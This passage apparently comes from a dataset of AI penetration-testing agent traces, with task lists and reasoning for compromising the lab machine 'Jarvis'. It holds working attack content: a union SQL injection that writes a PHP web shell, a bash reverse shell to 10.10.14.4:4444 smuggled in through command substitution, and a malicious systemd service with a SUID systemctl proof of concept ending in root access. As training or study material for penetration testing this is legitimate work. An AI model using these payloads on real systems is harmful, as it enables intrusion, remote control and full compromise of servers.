           2.1.2 Environment Details - {Server: Jarvis; Location: `/var/www/html`} (completed)
           2.1.3 Sudo Permissions - {Command: `sudo -l`; Defaults Entries: `env_reset` ensures a minimal environment is passed to the command, `mail_badpass` sends an email if a bad password is entered, `secure_path` specifies a secure PATH setting (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`)} (completed)
           2.1.4 Privileged Commands - {Permitted Command for www-data: Target User: pepper; Command: `/var/www/Admin-Utilities/simpler.py`; Permission: NOPASSWD (No password required for execution)} (completed)
           2.1.5 Security Implications - {The `www-data` user has passwordless `sudo` rights to execute `simpler.py` as the user `pepper`. This configuration can be potentially exploited if `simpler.py` is vulnerable to tampering or if `www-data` is compromised} (completed)
           2.1.6 Recommendations - {Review and Secure `simpler.py`: Ensure that `simpler.py` does not contain exploitable code or vulnerabilities that could be used to escalate privileges or execute arbitrary code. Implement strict access controls and regular audits on `simpler.py` to prevent unauthorized modifications. Limit Sudo Privileges: Reassess the necessity of granting `sudo` permissions to `www-data` for executing scripts as other users, especially without a password. Consider implementing command restrictions or requiring a password for sensitive operations to enhance security. Audit and Monitoring: Set up comprehensive logging and monitoring for actions performed using `sudo`, particularly for scripts executed with elevated privileges. Regularly review logs for unusual or unauthorized `sudo` activity. Incident Response Preparedness: Develop and test incident response plans that include scenarios of privilege escalation and unauthorized access through misuse of `sudo` privileges. This configuration should be carefully managed to prevent potential security breaches, considering the high level of access granted by these permissions} (completed)
       2.2 Security Analysis of Python Script for Command Injection Vulnerability - (completed)
           2.2.1 Script Functionality - {Purpose: Executes a ping command based on user input. Function: `exec_ping()`. Input Handling: Takes an IP address from user input and attempts to ping it} (completed)
           2.2.2 Security Measures in Place - {Filtered Characters: The script explicitly blocks a set of characters (`&`, `;`, `-.`, `` ` ``, `||`, `|`) to prevent command injection} (completed)
           2.2.3 Vulnerability Assessment - {Unfiltered Characters: The script does not block the use of `$`, `(`, and `)` characters. Potential Exploit: These unblocked characters can be used for bash command substitution (e.g., `$(cmd)`), which may allow an attacker to inject additional commands} (completed)
           2.2.4 Exploit Test - {Method: Use the script to test if command substitution (`$(cmd)`) allows execution of unintended commands. Example Test Input: Entering `127.0.0.1 $(id)` as the IP address to see if the script inadvertently executes the `id` command} (completed)
           2.2.5 Security Implications - {Allowing command substitution presents a significant security risk, potentially enabling attackers to execute arbitrary commands on the server or local machine where the script is running} (completed)
           2.2.6 Recommendations - {Enhance Input Validation: Update the script to filter out additional special characters and patterns that could lead to command injection, including `$`, `(`, and `)`. Use Secure Functions: Replace `os.system()` with more secure alternatives like `subprocess.run()`, which can safely handle command parameters without the risk of shell injection. Ensure commands are passed as lists to `subprocess.run()` to avoid shell interpretation. Security Testing: Implement automated tests to check for common injection patterns. Regularly update the list of forbidden characters based on emerging threats and exploit techniques. Code Audits: Conduct regular code reviews and security audits to identify and mitigate potential vulnerabilities. Educate developers on secure coding practices, particularly regarding input validation and handling external commands} (completed)
       2.3 Command Injection Exploit Analysis and Reverse Shell Execution - (completed)
           2.3.1 Initial Command Substitution Test - {Observation: Using command substitution, the username ""pepper"" was injected, and the system attempted to resolve it as a hostname, confirming that command execution via substitution was successful} (completed)
           2.3.2 Exploitation Strategy - {Objective: Gain a shell with the privileges of the user ""pepper"". Method: Due to restrictions on some special characters, the plan involves writing a reverse shell script and executing it through command injection} (completed)
           2.3.3 Steps to Execute the Reverse Shell - {1. Script Creation: Command: `echo 'bash -c ""bash -i >& /dev/tcp/10.10.14.4/4444 0>&1""' > /tmp/shell.sh`, Purpose: Writes a bash reverse shell script that connects back to the attacker's machine at `10.10.14.4` on port `4444`. 2. Make Script Executable: Command: `chmod a+x /tmp/shell.sh`, Purpose: Changes the permissions of `shell.sh` to ensure it is executable. 3. Execute Script via Command Injection: Injection Point: Within the `simpler.py` script execution context, using `sudo -u pepper`. Injected Command: `$(/tmp/shell.sh)`, Result: Successfully obtained a reverse shell as the user ""pepper""} (completed)
           2.3.4 Security Implications - {The ability to write and execute arbitrary scripts highlights significant security weaknesses, particularly around input validation and privilege management. Execution of arbitrary code as another user (pepper) via command injection poses a severe security risk, potentially leading to unauthorized access and control over the system} (completed)
           2.3.5 Recommendations - {Immediate Remediation: Remove the `shell.sh` script and audit the system for any other malicious files or scripts. Patch the vulnerabilities in the `simpler.py` script to prevent further exploitation. Enhance Security Measures: Implement stringent input validation in all scripts and applications to prevent command injection. Review and restrict sudo permissions to minimize the risk of privilege escalation. Regularly update and audit security policies and practices to address new and emerging threats. Monitoring and Logging: Enhance monitoring of system logs for unusual activities that could indicate attempted or successful exploitation. Set up alerts for unauthorized changes to critical files and configurations} (completed)
       2.4 Security Analysis: SUID Enumeration and Systemctl Exploitation - (completed)
           2.4.1 Objective - {Identify potential security vulnerabilities related to SUID (Set Owner User ID on execution) files on the system} (completed)
           2.4.2 Findings from SUID Enumeration - {Command Used: `find / -perm -4000 2>/dev/null`; SUID Files Identified: `/bin/fusermount`, `/bin/mount`, `/bin/ping`, `/bin/systemctl` (notably not SUID by default), `/bin/umount`, `/bin/su`; Additional files truncated in the report} (completed)
           2.4.3 Key Observation - {Systemctl as SUID: The presence of `systemctl` with SUID permissions is unusual as it is not set as SUID by default. This configuration can be exploited because `systemctl` is used to manage system services} (completed)
           2.4.4 Potential Exploitation Path - {Tool: `systemctl` (used to manage and control systemd services); Normal Configuration Location: `/etc/system/systemd` (not writable by non-root users); Exploitation Method: Utilize the `systemctl link` command to manipulate service links, potentially allowing escalation of privileges or unauthorized system modifications} (completed)
           2.4.5 Security Implications - {An SUID `systemctl` can provide an attacker with mechanisms to interact with system services in a way that may lead to privilege escalation. The ability to write or manipulate service files or links could allow an attacker to execute commands as root, compromising the entire system} (completed)
           2.4.6 Recommendations - {Immediate Action: Verify whether `systemctl` should have SUID permissions and remove these permissions if they are not necessary. Long-Term Security Measures: Audit all SUID files on the system to ensure they are legitimate and necessary. Implement strict filesystem permissions and access controls, particularly for critical system binaries and configuration files. Regularly review and update system and service configurations to close any loopholes that could be exploited for privilege escalation. Monitoring and Logging: Enhance system monitoring to detect and alert on unauthorized changes to SUID files or service configurations. Ensure comprehensive logging of system commands, particularly those related to service management, to aid in forensic investigations} (completed)
       2.4.7 SUID Misconfiguration and Exploitation of `systemctl` - (completed)
           2.4.7.1 Overview of SUID and `systemctl` - {SUID (Set User ID): Allows executable files to run with the permissions of the file owner, rather than the executing user. This can be a severe security risk if misconfigured. `systemctl`: Manages system services in Linux environments using systemd. Typically, it should not have SUID permissions as this can lead to privilege escalation} (completed)
           2.4.7.2 Exploitation of SUID `systemctl` - {Method: Creating and enabling a malicious systemd service unit file allows execution of arbitrary commands with root privileges. Steps for Exploitation: 1. Verify SUID on `systemctl`: Check if `systemctl` has SUID permissions using `ls -l $(which systemctl)`. 2. Create Malicious Service File: Craft a `.service` file in a writable directory that includes a payload in the `ExecStart` directive. 3. Link and Enable the Service: Use the SUID `systemctl` to link and enable the service, making it recognized by systemd. 4. Trigger the Payload: Execute the service, which runs the specified command with",Find a method to use systemctl link command to escalate privileges,"1. **Assessment of Current Strategic Position**:
   - The updated Penetration Testing Task List (PTT) highlighted the unusual SUID permissions set on `systemctl`. This discovery is critical as `systemctl` is a powerful tool used for managing system services, and its misconfiguration (SUID bit set) can potentially be exploited to escalate privileges.
   - Given the capabilities of `systemctl` when operating with elevated privileges, it becomes a prime target for exploitation, particularly in scenarios where an attacker seeks to elevate from a lower-privileged user to root.

2. **Key Findings Leading to Further Steps**:
   - **Unusual SUID Configuration**: The SUID bit set on `systemctl` is not typical and presents a unique opportunity for exploitation. This configuration allows any user to execute `systemctl` with root privileges.
   - **Potential for Privilege Escalation**: The ability to manipulate system services through `systemctl` can lead to executing arbitrary commands as the root user, thus achieving privilege escalation.

3. **Logical Progression to Selected Step**:
   - **Google Search for Exploitation Techniques**: To effectively exploit the identified vulnerability, detailed and specific knowledge about exploiting SUID configurations on `systemctl` is required. A Google search is the most straightforward approach to gather this information. This search can provide insights into known exploits, step-by-step guides, or community-shared vulnerabilities related to SUID and `systemctl`.
   - **Gathering and Analyzing Information**:
     - Search for terms like ""exploit SUID systemctl"", ""systemctl SUID privilege escalation"", or ""systemctl link exploit"".
     - Review credible sources such as security blogs, forums like Stack Exchange, GitHub for exploit scripts, and databases like Exploit-DB.
   - **Reference and Documentation**:
     - Document the sources of information that provide reliable and tested methods to exploit the SUID configuration on `systemctl`.
     - Use the gathered information to craft a proof-of-concept or a step-by-step exploitation guide based on the system's configuration and the current access level.

4. **Ethical and Security Considerations**:
   - **Responsible Use of Information**: Ensure that the information gathered and the methods employed are used responsibly within the scope of authorized penetration testing activities. Avoid testing on systems where explicit permission has not been granted.
   - **Documentation and Reporting**: Maintain a clear record of all sources and methods used during the testing. This documentation will be crucial for reporting the vulnerability to system administrators and for recommending mitigations.

By conducting a targeted Google search to gather more information on exploiting the SUID set `systemctl`, the strategy aligns directly with the objective of escalating privileges securely and effectively. This step is essential for understanding the technical details of the potential exploit and for preparing to demonstrate and mitigate the vulnerability responsibly.","**Security Analysis: SUID Misconfiguration and Exploitation of `systemctl`**

- **Overview of SUID and `systemctl`:**
  - **SUID (Set User ID):** Allows executable files to run with the permissions of the file owner, rather than the executing user. This can be a severe security risk if misconfigured.
  - **`systemctl`:** Manages system services in Linux environments using systemd. Typically, it should not have SUID permissions as this can lead to privilege escalation.

- **Exploitation of SUID `systemctl`:**
  - **Method:** Creating and enabling a malicious systemd service unit file allows execution of arbitrary commands with root privileges.
  - **Steps for Exploitation:**
    1. **Verify SUID on `systemctl`:** Check if `systemctl` has SUID permissions using `ls -l $(which systemctl)`.
    2. **Create Malicious Service File:** Craft a `.service` file in a writable directory that includes a payload in the `ExecStart` directive.
    3. **Link and Enable the Service:** Use the SUID `systemctl` to link and enable the service, making it recognized by systemd.
    4. **Trigger the Payload:** Execute the service, which runs the specified command with root privileges.

- **Example of Malicious Service File:**
  ```ini
  [Unit]
  Description=Root Shell Service

  [Service]
  Type=simple
  ExecStart=/bin/bash -c ""chmod u+s /bin/bash && /bin/bash -p""
  User=root
  Group=root
  Restart=on-failure

  [Install]
  WantedBy=multi-user.target
  ```
  - This service attempts to set the SUID bit on `/bin/bash`, then starts a privileged bash shell.

- **Proof of Concept (PoC):**
  - A simple PoC involves creating a temporary service file that executes a command like `id` to confirm privilege escalation:
    ```bash
    TF=$(mktemp).service
    echo '[Service]' > $TF
    echo 'Type=oneshot' >> $TF
    echo 'ExecStart=/bin/sh -c ""id > /tmp/output""' >> $TF
    ./systemctl link $TF
    ./systemctl enable --now $TF
    ```
  - Check `/tmp/output` for root user IDs, confirming the exploit's success.

- **Important Considerations:**
  - **Misconfiguration:** SUID on `systemctl` is a critical misconfiguration and not a default setting.
  - **Detection:** Regular scans for SUID binaries and audits of system configurations are essential to detect such vulnerabilities.
  - **Alternative Escalation Paths:** Other misconfigurations, such as inappropriate `sudoers` entries or weak permissions on systemd unit files, can also lead to privilege escalation.

- **References for Further Reading:**
  - GTFOBins provides detailed methods for exploiting binaries like `systemctl` with SUID for privilege escalation.
  - Articles and resources on understanding and mitigating risks associated with `systemctl` and systemd configurations.

By addressing these vulnerabilities and ensuring proper system configurations, the security posture against unauthorized privilege escalation can be significantly enhanced.",Execute the found exploitation,"1. **Evaluation of Previous Step Achievement**:
   - The previous steps in the penetration testing task list (PTT) focused on identifying and analyzing the SUID misconfiguration, particularly with the `systemctl` binary. These steps were successfully completed, with detailed findings about the potential for exploiting this misconfiguration to escalate privileges.
   - The key findings from these steps provided a clear and actionable method to exploit the SUID permissions on `systemctl`. This includes creating and enabling a malicious systemd service that can execute arbitrary commands with root privileges. Detailed steps for this exploitation, including crafting a service file and using `systemctl` to link and enable this service, were outlined.

2. **Key Findings and Implications for Further Steps**:
   - **Successful Identification of Exploitation Method**: The discovery and documentation of how to exploit the SUID configuration on `systemctl` provide a direct pathway for privilege escalation. This is a critical finding as it transforms the theoretical vulnerability into a practical exploit.
   - **Preparation for Exploitation**: The steps necessary to exploit this vulnerability have been clearly defined, including verifying the SUID status of `systemctl`, creating a malicious service file, and executing it to gain elevated privileges. This preparation sets the stage for actual exploitation.

3. **Strategy Evaluation and Next Steps**:
   - **Execute the Found Exploitation**: Given the successful identification and preparation phases, the next logical step is to execute the planned exploitation. This involves following the documented steps to create and activate the malicious service using the SUID `systemctl`. Execution of this strategy will validate the findings and demonstrate the security risk in a controlled environment.
   - **Methodology for Exploitation**:
     - Follow the detailed steps outlined in the previous findings to craft and deploy the malicious systemd service.
     - Monitor the execution to ensure it behaves as expected, verifying that it indeed escalates privileges to root.
   - **Continuation with the Current Strategy**: Moving forward with the exploitation of the `systemctl` SUID misconfiguration is justified based on the thorough groundwork laid in the previous steps. This approach not only tests the vulnerability in practice but also helps in formulating mitigation strategies by understanding the exploit's impact.

The decision to proceed with executing the found exploitation strategy is well-supported by comprehensive research and preparation documented in the PTT. This step is crucial for confirming the practical implications of the identified vulnerability and for demonstrating the need for urgent remediation actions to secure the system against potential real-world attacks.",Exploit the selected exploitations,"1. **Assessment of Current Strategic Position**:
   - The updated Penetration Testing Task List (PTT) and strategic plan have successfully outlined a method to exploit the SUID misconfiguration on `systemctl`. This method involves creating and activating a malicious systemd service to execute arbitrary commands with root privileges.
   - The detailed steps for this exploitation have been meticulously planned and documented, including verifying the SUID status of `systemctl`, crafting a malicious `.service` file, linking it, and enabling the service to trigger the payload.

2. **Key Findings Leading to Further Steps**:
   - **Identification of Exploitation Vector**: The PTT outlines a clear exploitation vector through the SUID misconfigured `systemctl`. This vector is critical as it provides a direct method for privilege escalation.
   - **Preparation for Execution**: All necessary components for the exploitation—such as the service file format and the commands to link and enable the service—have been prepared and are ready for execution. This preparation is crucial for a smooth execution process.

3. **Logical Progression to Selected Step**:
   - **Execute the Found Exploitation**: The next logical step is to execute the exploitation as planned. This execution will validate the theoretical vulnerability in a practical scenario, demonstrating the potential security risk.
   - **Methodology for Execution**:
     - Follow the documented steps to create the malicious `.service` file, ensuring it includes a payload capable of demonstrating privilege escalation (e.g., changing the SUID bit on `/bin/bash` or executing a command that only root can execute).
     - Use the `systemctl link` command to link the crafted service file, and then use `systemctl enable --now` to activate the service, triggering the payload.
     - Observe and document the outcome to confirm whether the exploitation successfully escalates privileges to root, as expected.
   - **Continuation with the Current Strategy**: Given the detailed planning and the direct pathway to exploit the identified vulnerability, it is appropriate and necessary to proceed with this strategy. Executing the exploitation not only tests the vulnerability but also helps in assessing the effectiveness of potential security measures.

By executing the planned exploitation, the strategy leverages the groundwork laid in the previous steps, moving from theoretical analysis to practical application. This step is crucial for demonstrating the real-world impact of the vulnerability, thus emphasizing the need for immediate remediation and strengthening the overall security posture of the system.",{'Interactive CLI': 'Enable the service with systemctl enable --now.'}
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)
   1.8 SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80) - (completed)
       1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} (completed)
       1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} (completed)
       1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} (completed)
       1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} (completed)
   1.9 Web Server Exploitation Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.9.1 Exploitation Steps - {File Creation via SQL Injection: SQL Injection Query: `http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[""exec""]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'; Outcome: Created a PHP file `pwned.php` on the server in the directory `/var/www/html`; File Content: PHP script capable of executing system commands passed through the `exec` request parameter} (completed)
       1.9.2 Remote Command Execution - {Command Execution Test: `curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami`; Result: Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges} (completed)
       1.9.3 Establishing a Reverse Shell - {Listening on Attacker's Machine: `nc -lvp 1234`; Connection Established: Server at `10.10.10.143` connected to the attacker's listener on port `1234`; Shell Interaction: Errors Reported: Issues related to terminal control (e.g., ""inappropriate ioctl for device"" and ""no job control in this shell""); Command Execution: Executing `whoami` within the shell confirmed the identity as `www-data`} (completed)
       1.9.4 Security Implications - {The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise. The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account} (completed)
       1.9.5 Recommendations - {Immediate Remediation: Patch the SQL injection vulnerability on `room.php`. Remove the malicious `pwned.php` file and check for other potentially malicious files. Review and restrict file permissions, especially in web-accessible directories; Security Enhancements: Implement stringent input validation and parameterized queries to prevent SQL injection. Regularly audit web server and database configurations to ensure they adhere to security best practices. Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts; Incident Response: Conduct a thorough investigation to determine if further exploitation or data breaches have occurred. Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation} (completed)
   2.0 Privilege Escalation - [to-do]
       2.1 Sudo Privileges Analysis for User www-data on Server ""Jarvis"" - (completed)
           2.1.1 Context - {Investigation of `sudo` permissions for the user `www-data`} (completed)
           2.1.2 Environment Details - {Server: Jarvis; Location: `/var/www/html`} (completed)
           2.1.3 Sudo Permissions - {Command: `sudo -l`; Defaults Entries: `env_reset` ensures a minimal environment is passed to the command, `mail_badpass` sends an email if a bad password is entered, `secure_path` specifies a secure PATH setting (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`)} (completed)
           2.1.4 Privileged Commands - {Permitted Command for www-data: Target User: pepper; Command: `/var/www/Admin-Utilities/simpler.py`; Permission: NOPASSWD (No password required for execution)} (completed)
           2.1.5 Security Implications - {The `www-data` user has passwordless `sudo` rights to execute `simpler.py` as the user `pepper`. This configuration can be potentially exploited if `simpler.py` is vulnerable to tampering or if `www-data` is compromised} (completed)
           2.1.6 Recommendations - {Review and Secure `simpler.py`: Ensure that `simpler.py` does not contain exploitable code or vulnerabilities that could be used to escalate privileges or execute arbitrary code. Implement strict access controls and regular audits on `simpler.py` to prevent unauthorized modifications. Limit Sudo Privileges: Reassess the necessity of granting `sudo` permissions to `www-data` for executing scripts as other users, especially without a password. Consider implementing command restrictions or requiring a password for sensitive operations to enhance security. Audit and Monitoring: Set up comprehensive logging and monitoring for actions performed using `sudo`, particularly for scripts executed with elevated privileges. Regularly review logs for unusual or unauthorized `sudo` activity. Incident Response Preparedness: Develop and test incident response plans that include scenarios of privilege escalation and unauthorized access through misuse of `sudo` privileges. This configuration should be carefully managed to prevent potential security breaches, considering the high level of access granted by these permissions} (completed)
       2.2 Security Analysis of Python Script for Command Injection Vulnerability - (completed)
           2.2.1 Script Functionality - {Purpose: Executes a ping command based on user input. Function: `exec_ping()`. Input Handling: Takes an IP address from user input and attempts to ping it} (completed)
           2.2.2 Security Measures in Place - {Filtered Characters: The script explicitly blocks a set of characters (`&`, `;`, `-.`, `` ` ``, `||`, `|`) to prevent command injection} (completed)
           2.2.3 Vulnerability Assessment - {Unfiltered Characters: The script does not block the use of `$`, `(`, and `)` characters. Potential Exploit: These unblocked characters can be used for bash command substitution (e.g., `$(cmd)`), which may allow an attacker to inject additional commands} (completed)
           2.2.4 Exploit Test - {Method: Use the script to test if command substitution (`$(cmd)`) allows execution of unintended commands. Example Test Input: Entering `127.0.0.1 $(id)` as the IP address to see if the script inadvertently executes the `id` command} (completed)
           2.2.5 Security Implications - {Allowing command substitution presents a significant security risk, potentially enabling attackers to execute arbitrary commands on the server or local machine where the script is running} (completed)
           2.2.6 Recommendations - {Enhance Input Validation: Update the script to filter out additional special characters and patterns that could lead to command injection, including `$`, `(`, and `)`. Use Secure Functions: Replace `os.system()` with more secure alternatives like `subprocess.run()`, which can safely handle command parameters without the risk of shell injection. Ensure commands are passed as lists to `subprocess.run()` to avoid shell interpretation. Security Testing: Implement automated tests to check for common injection patterns. Regularly update the list of forbidden characters based on emerging threats and exploit techniques. Code Audits: Conduct regular code reviews and security audits to identify and mitigate potential vulnerabilities. Educate developers on secure coding practices, particularly regarding input validation and handling external commands} (completed)
       2.3 Command Injection Exploit Analysis and Reverse Shell Execution - (completed)
           2.3.1 Initial Command Substitution Test - {Observation: Using command substitution, the username ""pepper"" was injected, and the system attempted to resolve it as a hostname, confirming that command execution via substitution was successful} (completed)
           2.3.2 Exploitation Strategy - {Objective: Gain a shell with the privileges of the user ""pepper"". Method: Due to restrictions on some special characters, the plan involves writing a reverse shell script and executing it through command injection} (completed)
           2.3.3 Steps to Execute the Reverse Shell - {1. Script Creation: Command: `echo 'bash -c ""bash -i >& /dev/tcp/10.10.14.4/4444 0>&1""' > /tmp/shell.sh`, Purpose: Writes a bash reverse shell script that connects back to the attacker's machine at `10.10.14.4` on port `4444`. 2. Make Script Executable: Command: `chmod a+x /tmp/shell.sh`, Purpose: Changes the permissions of `shell.sh` to ensure it is executable. 3. Execute Script via Command Injection: Injection Point: Within the `simpler.py` script execution context, using `sudo -u pepper`. Injected Command: `$(/tmp/shell.sh)`, Result: Successfully obtained a reverse shell as the user ""pepper""} (completed)
           2.3.4 Security Implications - {The ability to write and execute arbitrary scripts highlights significant security weaknesses, particularly around input validation and privilege management. Execution of arbitrary code as another user (pepper) via command injection poses a severe security risk, potentially leading to unauthorized access and control over the system} (completed)
           2.3.5 Recommendations - {Immediate Remediation: Remove the `shell.sh` script and audit the system for any other malicious files or scripts. Patch the vulnerabilities in the `simpler.py` script to prevent further exploitation. Enhance Security Measures: Implement stringent input validation in all scripts and applications to prevent command injection. Review and restrict sudo permissions to minimize the risk of privilege escalation. Regularly update and audit security policies and practices to address new and emerging threats. Monitoring and Logging: Enhance monitoring of system logs for unusual activities that could indicate attempted or successful exploitation. Set up alerts for unauthorized changes to critical files and configurations} (completed)
       2.4 Security Analysis: SUID Enumeration and Systemctl Exploitation - (completed)
           2.4.1 Objective - {Identify potential security vulnerabilities related to SUID (Set Owner User ID on execution) files on the system} (completed)
           2.4.2 Findings from SUID Enumeration - {Command Used: `find / -perm -4000 2>/dev/null`; SUID Files Identified: `/bin/fusermount`, `/bin/mount`, `/bin/ping`, `/bin/systemctl` (notably not SUID by default), `/bin/umount`, `/bin/su`; Additional files truncated in the report} (completed)
           2.4.3 Key Observation - {Systemctl as SUID: The presence of `systemctl` with SUID permissions is unusual as it is not set as SUID by default. This configuration can be exploited because `systemctl` is used to manage system services} (completed)
           2.4.4 Potential Exploitation Path - {Tool: `systemctl` (used to manage and control systemd services); Normal Configuration Location: `/etc/system/systemd` (not writable by non-root users); Exploitation Method: Utilize the `systemctl link` command to manipulate service links, potentially allowing escalation of privileges or unauthorized system modifications} (completed)
           2.4.5 Security Implications - {An SUID `systemctl` can provide an attacker with mechanisms to interact with system services in a way that may lead to privilege escalation. The ability to write or manipulate service files or links could allow an attacker to execute commands as root, compromising the entire system} (completed)
           2.4.6 Recommendations - {Immediate Action: Verify whether `systemctl` should have SUID permissions and remove these permissions if they are not necessary. Long-Term Security Measures: Audit all SUID files on the system to ensure they are legitimate and necessary. Implement strict filesystem permissions and access controls, particularly for critical system binaries and configuration files. Regularly review and update system and service configurations to close any loopholes that could be exploited for privilege escalation. Monitoring and Logging: Enhance system monitoring to detect and alert on unauthorized changes to SUID files or service configurations. Ensure comprehensive logging of system commands, particularly those related to service management, to aid in forensic investigations} (completed)
       2.4.7 SUID Misconfiguration and Exploitation of `systemctl` - (completed)
           2.4.7.1 Overview of SUID and `systemctl` - {SUID (Set User ID): Allows executable files to run with the permissions of the file owner, rather than the executing user. This can be a severe security risk if misconfigured. `systemctl`: Manages system services in Linux environments using systemd. Typically, it should not have SUID permissions as this can lead to privilege escalation} (completed)
           2.4.7.2 Exploitation of SUID `systemctl` - {Method: Creating and enabling a malicious systemd service unit file allows execution of arbitrary commands with root privileges. Steps for Exploitation: 1. Verify SUID on `systemctl`: Check if `systemctl` has SUID permissions using `ls -l $(which systemctl)`. 2. Create Malicious Service File: Craft a `.service` file in a writable directory that includes a payload in the `ExecStart` directive. 3. Link and Enable the Service: Use the SUID `systemctl` to link and enable the service, making it recognized by systemd. 4. Trigger the Payload: Execute the service, which runs the specified command with",Execute the found exploitation,"1. **Assessment of Current Strategic Position**:
   - The updated Penetration Testing Task List (PTT) and strategic plan have successfully outlined a method to exploit the SUID misconfiguration on `systemctl`. This method involves creating and activating a malicious systemd service to execute arbitrary commands with root privileges.
   - The detailed steps for this exploitation have been meticulously planned and documented, including verifying the SUID status of `systemctl`, crafting a malicious `.service` file, linking it, and enabling the service to trigger the payload.

2. **Key Findings Leading to Further Steps**:
   - **Identification of Exploitation Vector**: The PTT outlines a clear exploitation vector through the SUID misconfigured `systemctl`. This vector is critical as it provides a direct method for privilege escalation.
   - **Preparation for Execution**: All necessary components for the exploitation—such as the service file format and the commands to link and enable the service—have been prepared and are ready for execution. This preparation is crucial for a smooth execution process.

3. **Logical Progression to Selected Step**:
   - **Execute the Found Exploitation**: The next logical step is to execute the exploitation as planned. This execution will validate the theoretical vulnerability in a practical scenario, demonstrating the potential security risk.
   - **Methodology for Execution**:
     - Follow the documented steps to create the malicious `.service` file, ensuring it includes a payload capable of demonstrating privilege escalation (e.g., changing the SUID bit on `/bin/bash` or executing a command that only root can execute).
     - Use the `systemctl link` command to link the crafted service file, and then use `systemctl enable --now` to activate the service, triggering the payload.
     - Observe and document the outcome to confirm whether the exploitation successfully escalates privileges to root, as expected.
   - **Continuation with the Current Strategy**: Given the detailed planning and the direct pathway to exploit the identified vulnerability, it is appropriate and necessary to proceed with this strategy. Executing the exploitation not only tests the vulnerability but also helps in assessing the effectiveness of potential security measures.

By executing the planned exploitation, the strategy leverages the groundwork laid in the previous steps, moving from theoretical analysis to practical application. This step is crucial for demonstrating the real-world impact of the vulnerability, thus emphasizing the need for immediate remediation and strengthening the overall security posture of the system.","**Summary of Security Testing Outcome: Root Access Achievement**

- **Outcome:** Successful acquisition of root access on the target system.
- **Implication:** This indicates a critical security vulnerability that allowed escalation of privileges to the highest level.
- **Next Steps:**
